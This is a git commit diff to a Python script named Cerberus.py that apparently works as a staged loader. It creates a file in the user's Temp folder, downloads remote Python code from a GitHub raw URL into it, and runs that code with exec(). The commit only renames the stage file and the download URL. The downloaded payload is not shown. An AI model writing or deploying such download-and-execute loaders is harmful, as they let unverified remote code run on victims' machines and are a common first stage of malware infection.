f03d4204975bff638dcb68f90df0c06f6e4a9cb9
Param Kudle <136839842+paramkudle@users.noreply.github.com>
2024-07-02 18:05:49 +0530

    Improvement Commit

--- Cerberus.py
+++ Cerberus.py
@@ -2,15 +2,15 @@ import os.path
 import urllib.request
 from bs4 import BeautifulSoup
 
-path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1.py")
+path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1Host.py")
 
 if os.path.isfile(path) == False:   # Creates the Stage 1 File if it doesn't exist
-    file = open('Stage1.py', 'a')
+    file = open('Stage1Host.py', 'a')
     file.close()
 
 
 # Retrieves code from URL and appends it into Stage1 created earlier 
-urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1Source.txt", path)  
+urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1.txt", path)  
 
 # Runs the Stage1 file
 exec(open(path).read())  
